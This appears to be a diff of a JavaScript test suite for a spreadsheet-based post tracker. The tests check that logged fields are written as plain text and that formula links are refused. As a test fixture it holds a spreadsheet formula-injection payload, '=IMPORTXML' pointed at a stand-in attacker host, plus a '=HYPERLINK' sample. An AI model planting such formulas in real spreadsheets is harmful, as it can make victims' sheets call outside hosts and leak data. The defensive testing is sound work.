@@ -71,14 +71,14 @@ describe('what is written is plain text (D7, bug 2)', () => {
     w.team.writeText(['=Jan', '', 'Intern', 'key-formula', '', 'TRUE']);
     w.logPost('maria', CASA, {
       type: '=IMPORTXML("https://evil.example", "//a")',
-      postLink: 'https://www.facebook.com/groups/apg/posts/+639171234567/',
+      postLink: 'https://www.facebook.com/groups/apg/posts/0639171234567/',
       postedBy: '=Jan',
     });
 
     // The type comes from the Directory, not the request; the rest is written exactly.
     expect(w.posts.row(2)).toEqual([
       '2026-03-09', 'Casa Amara', 'Condo / House and Lot', '10:00 AM', 'Posted', 'APG Main',
-      'https://www.facebook.com/groups/apg/posts/+639171234567/', '=Jan', CASA.id, '',
+      'https://www.facebook.com/groups/apg/posts/0639171234567/', '=Jan', CASA.id, '',
     ]);
   });
 
@@ -89,20 +89,23 @@ describe('what is written is plain text (D7, bug 2)', () => {
     expect(w.posts.row(2)[1]).toBe('1201');
   });
 
-  it('writes the link and the status addLink sets as text too', () => {
+  it('writes the link and the status addLink sets as text too, and refuses a formula for a link', () => {
     const w = createWorld();
     w.logPost('jan', CASA, { status: 'Pending' });
     expect(w.call('jan', 'addLink', { property: CASA.name, propertyId: CASA.id, postLink: '=HYPERLINK("x")' })).toMatchObject({
-      ok: true,
+      ok: false,
+      error: 'bad-link',
     });
+    const live = 'https://www.facebook.com/groups/apg/posts/0123/';
+    expect(w.call('jan', 'addLink', { property: CASA.name, propertyId: CASA.id, postLink: live })).toMatchObject({ ok: true });
 
-    expect(w.posts.row(2).slice(4, 7)).toEqual(['Posted', 'APG Main', '=HYPERLINK("x")']);
+    expect(w.posts.row(2).slice(4, 7)).toEqual(['Posted', 'APG Main', live]);
   });
 
   it('grows a tracker with no empty row left, rather than failing', () => {
     const w = createWorld();
     const full = w.tracker.addSheet('Full', ['Date', 'Title', 'Time', 'Status', 'Post Link', 'Posted By'], { rows: 2 });
-    full.type(['2026-03-01', 'Lot 1', '09:00', 'Posted', LINK, 'Ana Reyes']);
+    full.type(['2026-03-01', 'Lot 1', '09:00', 'Posted', 'https://www.facebook.com/groups/apg/posts/900/', 'Ana Reyes']);
     w.project.configure({ POSTS_TAB: 'Full' });
 
     expect(w.logPost('jan', CASA)).toMatchObject({ ok: true });
